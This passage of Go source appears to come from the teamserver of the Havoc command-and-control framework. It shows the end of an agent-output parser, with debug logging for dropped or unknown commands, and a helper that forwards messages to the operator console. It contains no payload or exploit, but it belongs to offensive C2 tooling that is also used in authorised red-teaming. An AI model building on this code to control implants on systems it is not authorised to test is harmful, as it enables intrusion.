		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PACKAGE_DROPPED, Invalid packet", AgentID))
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break;

	default:
		logger.Debug(fmt.Sprintf("Agent: %x, Command: UNKNOWN (%d))", AgentID, CommandID))
		/* end of the switch case output parser */
		break
	}

	if Parser.Length() > 0 {
		logger.Debug(fmt.Sprintf("Agent: %x, %d bytes were left unread", AgentID, Parser.Length()))
	}
}

func (a *Agent) Console(Console func(DemonID string, CommandID int, Output map[string]string), Type, Text, Output string) {
	var Message = map[string]string{
		"Type":    Type,
		"Message": Text,
		"Output":  Output,
	}

	Console(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
}
